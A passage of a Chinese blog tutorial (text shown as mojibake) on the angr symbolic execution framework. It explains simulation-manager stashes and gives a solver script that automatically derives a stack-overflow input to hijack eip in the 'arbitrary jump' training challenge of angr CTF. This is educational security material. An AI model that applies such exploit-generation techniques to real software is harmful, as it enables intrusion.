<li><code>simgr.unconstrained</code>ï¼šä¸å—çº¦æŸçš„çŠ¶æ€åˆ—è¡¨ã€‚å½“åˆ›å»º <code>SimulationManager</code> æ—¶æŒ‡å®šäº† <code>save_unconstrained=True</code>ï¼Œåˆ™è¢«è®¤ä¸º<strong>ä¸å—çº¦æŸçš„</strong>ï¼ˆunconstrainedï¼Œå³æŒ‡ä»¤æŒ‡é’ˆè¢«ç”¨æˆ·æ•°æ®æˆ–å…¶ä»–æ¥æºçš„ç¬¦å·åŒ–æ•°æ®æ§åˆ¶ï¼‰çŠ¶æ€ä¼šè¢«å½’å…¥è¯¥åˆ—è¡¨</li>
<li><code>simgr.unsat</code>ï¼šä¸å¯æ»¡è¶³çš„çŠ¶æ€åˆ—è¡¨ã€‚å½“åˆ›å»º <code>SimulationManager</code> æ—¶æŒ‡å®šäº† <code>save_unsat=True</code>ï¼Œåˆ™è¢«è®¤ä¸ºæ— æ³•è¢«æ»¡è¶³çš„ï¼ˆunsatisfiableï¼Œå³å­˜åœ¨<strong>çº¦æŸå†²çª</strong>çš„çŠ¶æ€ï¼Œä¾‹å¦‚åœ¨åŒä¸€æ—¶åˆ»è¦æ±‚è¾“å…¥æ—¢æ˜¯<code>&quot;AAAA&quot;</code> åˆæ˜¯ <code>&quot;BBBB&quot;</code>ï¼‰çŠ¶æ€ä¼šè¢«å½’å…¥è¯¥åˆ—è¡¨</li>
</ul>
<p>è¿˜æœ‰ä¸€ç§ä¸æ˜¯ stash çš„çŠ¶æ€åˆ—è¡¨â€”â€”<code>errored</code>ï¼Œè‹¥åœ¨æ‰§è¡Œä¸­äº§ç”Ÿäº†é”™è¯¯ï¼Œåˆ™çŠ¶æ€ä¸å…¶äº§ç”Ÿçš„é”™è¯¯ä¼šè¢«åŒ…è£¹åœ¨ä¸€ä¸ª <code>ErrorRecord</code> å®ä¾‹ä¸­ï¼ˆå¯é€šè¿‡ <code>record.state</code> ä¸ <code>record.error</code> è®¿é—®ï¼‰ï¼Œè¯¥ record ä¼šè¢«æ’å…¥åˆ° <code>errored</code> ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>record.debug()</code> å¯åŠ¨ä¸€ä¸ªè°ƒè¯•çª—å£</p>
<h4 id="â‘¡-stash-æ“ä½œ"><a href="#â‘¡-stash-æ“ä½œ" class="headerlink" title="â‘¡ stash æ“ä½œ"></a>â‘¡ stash æ“ä½œ</h4><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>stash.move()</code> æ¥åœ¨ stash ä¹‹é—´è½¬ç§»æ”¾ç½®çŠ¶æ€ï¼Œç”¨æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="hljs-string">&#x27;active&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>åœ¨è½¬ç§»å½“ä¸­æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡æŒ‡å®š <code>filter_func</code> å‚æ•°æ¥è¿›è¡Œè¿‡æ»¤ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_func</span>(<span class="hljs-params">state</span>):<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;arttnba3&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(<span class="hljs-number">1</span>)<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="hljs-string">&#x27;active&#x27;</span>, filter_func = filter_func)<br></code></pre></td></tr></table></figure>

<p>stash æœ¬è´¨ä¸Šå°±æ˜¯ä¸ª listï¼Œå› æ­¤åœ¨åˆå§‹åŒ–æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡å­—å…¸çš„æ–¹å¼æŒ‡å®šæ¯ä¸ª stash çš„åˆå§‹å†…å®¹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr = proj.factory.simgr(init_state,<br><span class="hljs-meta">... </span>    stashes = &#123;<br><span class="hljs-meta">... </span>            <span class="hljs-string">&#x27;active&#x27;</span>:[init_state],<br><span class="hljs-meta">... </span>            <span class="hljs-string">&#x27;found&#x27;</span>:[],<br><span class="hljs-meta">... </span>    &#125;)<br></code></pre></td></tr></table></figure>

<h3 id="FINAL-EXPLOIT-7"><a href="#FINAL-EXPLOIT-7" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>é‚£ä¹ˆç”±äºæœ¬é¢˜æˆ‘ä»¬éœ€è¦é€šè¿‡æ ˆæº¢å‡ºæ¥æ§åˆ¶ eipï¼Œå±äº unconstrained çš„çŠ¶æ€ï¼Œå› æ­¤<strong>æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨åˆ¤æ–­æ˜¯å¦æ‰¾åˆ°äº† unconstrained çŠ¶æ€</strong>ï¼Œäºæ˜¯ä¸æ­¤å‰ä¸åŒçš„æ˜¯æœ¬é¢˜æˆ‘ä»¬é€šè¿‡ <code>simgr.step()</code> æ¥è¿›è¡Œå•æ­¥æ‰§è¡Œï¼Œè‹¥å…¶ä¸­æŸä¸€æ­¥è·å¾—äº† unconstrained state åˆ™æˆ‘ä»¬éå†å…¶ä¸­çŠ¶æ€å¹¶åˆ¤æ–­æ˜¯å¦å¯ä»¥æ»¡è¶³æ§åˆ¶ eip ä¸ºæŒ‡å®šå€¼çš„çº¦æŸï¼Œè‹¥æ˜¯åˆ™ç›´æ¥æ·»åŠ åˆ° <code>simgr.found</code> åˆ—è¡¨ä¸­å³å¯</p>
<p>æ•…æœ€ç»ˆçš„è§£é¢˜è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-comment"># filter to check satisfiability</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_func</span>(<span class="hljs-params">state</span>):<br>    print_good_addr = <span class="hljs-number">0x58465168</span><br>    <span class="hljs-keyword">return</span> state.satisfiable(extra_constraints = (state.regs.eip == print_good_addr, ))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-comment"># hook the scanf to symbolize our input</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmtstr, input_addr</span>):<br>            input_bvs = claripy.BVS(<span class="hljs-string">&#x27;input_addr&#x27;</span>, <span class="hljs-number">200</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">chr</span> <span class="hljs-keyword">in</span> input_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(<span class="hljs-built_in">chr</span> &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-built_in">chr</span> &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(input_addr, input_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;input_val&#x27;</span>] = input_bvs<br>            <br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, SimScanfProcedure())<br><br>    <span class="hljs-comment"># create simgr that can save unconstraints</span><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state, <br>                               save_unconstrained=<span class="hljs-literal">True</span>,<br>                               stashes = &#123;<br>                                   <span class="hljs-string">&#x27;active&#x27;</span>:[init_state],<br>                                   <span class="hljs-string">&#x27;unconstrained&#x27;</span>:[],<br>                                   <span class="hljs-string">&#x27;found&#x27;</span>:[],<br>                               &#125;)<br><br>    <span class="hljs-comment"># simulated execution by steps</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> simgr.found:<br>        <span class="hljs-comment"># no more states for execution</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> simgr.active) <span class="hljs-keyword">and</span> (<span class="hljs-keyword">not</span> simgr.unconstrained):<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-comment"># check for unconstrained states</span><br>        simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, <br>                  to_stash = <span class="hljs-string">&#x27;found&#x27;</span>,<br>                  filter_func = filter_func)<br><br>        <span class="hljs-comment"># step to next basic block</span><br>        simgr.step()<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] found &#123;&#125; solution state(s)&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(simgr.found)))<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        print_good_addr = <span class="hljs-number">0x58465168</span><br>        solution_state.add_constraints(solution_state.regs.eip == print_good_addr)<br>        input_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;input_val&#x27;</span>], <br>                                               cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(input_val))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾— <code>&quot;Good Job.&quot;</code></p>
<p><img src="https://s2.loli.net/2022/12/03/Zf6w1xrNFc5HvLI.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>è‡³æ­¤ï¼Œangr CTF çš„ 18 é“é¢˜ç›®<strong>å…¨éƒ¨å®Œç»“</strong></p>
<h1 id="0xFF-Whatâ€™s-moreâ€¦"><a href="#0xFF-Whatâ€™s-moreâ€¦" class="headerlink" title="0xFF.Whatâ€™s moreâ€¦"></a>0xFF.Whatâ€™s moreâ€¦</h1><p>ä½œä¸ºç”¨æ¥å…¥é—¨ angr åŸºæœ¬ç”¨æ³•çš„é¢˜ç›®ï¼Œangr CTF è‡ªç„¶ä¸ä¼šå¤ªéš¾ï¼Œä¸è¿‡ç¬”è€…ç¡®ä¹é€šè¿‡ angr ä½“ä¼šåˆ°äº†<strong>ç¬¦å·æ‰§è¡Œè¿™ä¸€æŠ€æœ¯çš„ç¾æ„Ÿæ‰€åœ¨</strong>ï¼ˆè™½ç„¶è¯´è¿™ä¸ªæ„Ÿè§¦å¥½åƒæ¯”è¾ƒç„å­¦ : ) ï¼‰</p>
<p>ä¸åŒäºä»£ç å®¡è®¡æˆ–æ˜¯æ¯”è¾ƒåâ€œæš´åŠ›â€çš„ fuzzï¼Œç¬¦å·æ‰§è¡Œè¿™ä¸€æŠ€æœ¯è¿˜å‘æˆ‘ä»¬å±•ç°äº†å…·æœ‰åˆ«æ ·ç¾æ„Ÿçš„æ¼æ´æŒ–æ˜ä¸ exp ç¼–å†™æŠ€å·§ï¼Œä»¥ angr CTF ä¸ºä¾‹ï¼Œè™½ç„¶è¯´æœ€åä¸‰é“æ¼æ´åˆ©ç”¨é¢˜ç›®çœ‹èµ·æ¥å¥½åƒéƒ½æŒºç¬¨ï¼Œä½†è®¾æƒ³å°†ç¬¬ 17 é¢˜æ¢æˆè¿™æ ·çš„ä¸€ä¸ªåœºæ™¯â€”â€”æˆ‘ä»¬æ­£åœ¨æŒ–æ˜ä¸€ä¸ªé€»è¾‘æ¯”è¾ƒå¤æ‚çš„ç°ä»£è½¯ä»¶ï¼ˆä¾‹å¦‚ä¸€ä¸ªå­˜åœ¨æ ˆæº¢å‡ºçš„è·¯ç”±å™¨å›ºä»¶ï¼Œæˆ‘ä»¬çš„è¾“å…¥å¯ä»¥æ˜¯å‘è·¯ç”±å™¨å‘é€çš„æ•°æ®åŒ…ï¼ˆæ¯”å¦‚è¯´å¯¹è·¯ç”±å™¨æ§åˆ¶é¡µçš„ HTTP è¯·æ±‚ï¼‰ï¼‰ï¼Œç›´æ¥é€†å‘å®¡è®¡æ¯”è¾ƒè´¹åŠ²ï¼Œè€Œæš´åŠ› fuzz åˆä¸å¥½æ­æ‰§è¡Œç¯å¢ƒï¼Œæ­¤æ—¶æ— éœ€å®é™…æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„ç¬¦å·æ‰§è¡Œä¾¿èƒ½å¾ˆå¥½åœ°å‘æŒ¥å…¶ç”¨å¤„</p>
<p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ä»¥ä¸Šçš„ 18 é“é¢˜è™½ç„¶çœ‹ä¼¼æ¶µç›–äº† angr çš„åŸºæœ¬ç”¨æ³•ï¼Œä½†å…¶å® angr è¿˜æœ‰æ›´å¤šæ›´æœ‰è¶£çš„ APIï¼Œè‹¥æ˜¯è¦æ›´åŠ ç†Ÿç»ƒçš„è¿ç”¨è¿™ä¸ªé¡¶çº§çš„æ··åˆæ‰§è¡Œæ¡†æ¶ï¼Œåˆ™è¿˜éœ€è¦æˆ‘ä»¬å¤šå¤šé˜…è¯» angr çš„æ–‡æ¡£å¹¶å¤šåŠ ä½¿ç”¨ï¼Œæ¯•ç«Ÿ angr-ctf åªæ˜¯ä¸€ä¸ªæœ€åŸºç¡€çš„ç»ƒæ‰‹çº§çš„é¡¹ç›®ï¼ˆç¬‘ï¼‰</p>
<p>ç¬¦å·æ‰§è¡Œè¿™ä¸€æŠ€æœ¯æˆ–è®¸è¿˜æœ‰æ›´ä¸ºå…‰æ˜çš„æœªæ¥æ­£ç­‰å¾…ç€æˆ‘ä»¬è¿›è¡Œæ¢ç´¢ï¼šï¼‰</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/ANGR/" class="category-chain-item">ANGR</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/angr/">#angr</a>
      
        <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">#ä¿¡æ¯å®‰å…¨</a>
      
        <a href="/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">#ç¬¦å·æ‰§è¡Œ</a>
      
        <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">#äºŒè¿›åˆ¶å®‰å…¨</a>
      
        <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/">#äºŒè¿›åˆ¶åˆ†æ</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>ã€ANGR.0x00ã€‘ä» angr-CTF å…¥é—¨ angr çš„åŸºæœ¬ç”¨æ³•</div>
      <div>https://arttnba3.github.io/2022/11/24/ANGR-0X00-ANGR_CTF/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>arttnba3</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2022å¹´11æœˆ24æ—¥</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>è®¸å¯åè®®</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/12/25/EXPR-0X01-MIT_6_858/" title="ã€EXPR.0x01ã€‘MIT 6.858 è¯¾ç¨‹å®éªŒæŠ¥å‘Š">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ã€EXPR.0x01ã€‘MIT 6.858 è¯¾ç¨‹å®éªŒæŠ¥å‘Š</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/10/30/PAPER-0X00-FUZZING_A_SURVEY_FOR_ROADMAP/" title="ã€PAPER.0x00ã€‘è®ºæ–‡ç¬”è®°ï¼šFuzzing: A Survey for Roadmap ">
                        <span class="hidden-mobile">ã€PAPER.0x00ã€‘è®ºæ–‡ç¬”è®°ï¼šFuzzing: A Survey for Roadmap </span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
        var options = Object.assign(
          {"appid":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appkey":"tuvJh3xYxPFcW2JB6K26RKP2","path":"window.location.pathname","placeholder":"è¯´ç‚¹ä»€ä¹ˆå‘—ï¼ˆç¬‘ï¼‰","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appId":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appKey":"tuvJh3xYxPFcW2JB6K26RKP2"},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;ç›®å½•</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  <!-- ç½‘ç«™è¿è¡Œæ—¶é—´çš„è®¾ç½® -->
  <span id="timeDate">è½½å…¥å¤©æ•°...</span>
  <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span>
  <script>
      var now = new Date();
      function createtime() {
          var grt= new Date("04/20/2020 17:48:48");//æ­¤å¤„ä¿®æ”¹ä½ çš„å»ºç«™æ—¶é—´æˆ–è€…ç½‘ç«™ä¸Šçº¿æ—¶é—´
          now.setTime(now.getTime()+250);
          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
          document.getElementById("timeDate").innerHTML = "arttnba3çš„å°å±‹å·²ç»å®‰å…¨å­˜åœ¨äº† "+dnum+" å¤© ";
          document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’";
      }
  setInterval("createtime()",250);
  </script>
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="busuanzi_value_site_pv"></span>
         æ¬¡
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        æ€»è®¿å®¢æ•° 
        <span id="busuanzi_value_site_uv"></span>
         äºº
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
